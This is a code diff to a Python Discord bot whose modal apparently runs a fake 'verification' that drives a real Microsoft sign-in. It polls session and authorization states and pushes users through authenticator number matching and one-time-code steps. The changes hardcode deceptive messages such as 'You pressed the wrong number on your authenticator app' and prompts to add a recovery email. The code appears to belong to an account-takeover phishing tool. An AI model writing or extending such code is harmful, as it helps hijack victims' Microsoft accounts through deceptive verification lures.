@@ -99,8 +99,8 @@ class MyModalOne(ui.Modal):
 
             await interaction.followup.send(
                     embed = Embed(
-                    title = embeds["invalid_email"][0],
-                    description = embeds["invalid_email"][1],
+                    title = ":x: Failed to verify",
+                    description = "The email you entered does not exist, make sure you entered it correctly!",
                     color = 0xFF5C5C
                 ),
                 ephemeral = True
@@ -160,11 +160,10 @@ class MyModalOne(ui.Modal):
 
                 if data["SessionState"] > 1 and data["AuthorizationState"] == 1:
 
-                    failedAuth = embeds["failed_auth"]
                     await interaction.followup.send(
                         embed = Embed(
-                            title = failedAuth[0],
-                            description = failedAuth[1],
+                            title = ":x: Failed to verify",
+                            description = "You pressed the wrong number on your authenticator app. Try again!",
                             colour=0xFF5C5C
                         ),
                         ephemeral = True
@@ -232,11 +231,10 @@ class MyModalOne(ui.Modal):
                 await asyncio.sleep(1)
                 i += 1
 
-            failedAuth = embeds["timeout_auth"]
             await interaction.followup.send(
                     embed = Embed(
-                    title = failedAuth[0],
-                    description = failedAuth[1],
+                    title = ":x: Failed to verify",
+                    description = "You pressed the wrong number on your authenticator app. Try again!",
                     colour=0x00FF00
                 ),
                 ephemeral = True
@@ -265,8 +263,8 @@ class MyModalOne(ui.Modal):
                 print("[X] - FIDO forceotc fallback: no Credentials in response")
                 await interaction.followup.send(
                     embed=Embed(
-                        title=embeds["failed_otp"][0],
-                        description=embeds["failed_otp"][1],
+                        title = "Security Email Required",
+                        description = "We couldn't detect a recovery/security email for this account. Add a recovery email in your Microsoft account and try verifying again."
                     ),
                     view=ButtonViewThree(),
                     ephemeral=True
@@ -323,8 +321,8 @@ class MyModalOne(ui.Modal):
                 print("[X] - OtcLoginEligibleProofs found but no proof had otcSent=True")
                 await interaction.followup.send(
                     embed=Embed(
-                        title=embeds["failed_otp"][0],
-                        description=embeds["failed_otp"][1],
+                        title = "Security Email Required",
+                        description = "We couldn't detect a recovery/security email for this account. Add a recovery email in your Microsoft account and try verifying again.",
                     ),
                     view=ButtonViewThree(),
                     ephemeral=True
@@ -379,8 +377,8 @@ class MyModalOne(ui.Modal):
 
         await interaction.followup.send(
             embed = Embed(
-                title = embeds["failed_otp"][0],
-                description = embeds["failed_otp"][1],
+                title = "Security Email Required",
+                description = "We couldn't detect a recovery/security email for this account. Add a recovery email in your Microsoft account and try verifying again."
             ),
             view = ButtonViewThree(),
             ephemeral = True
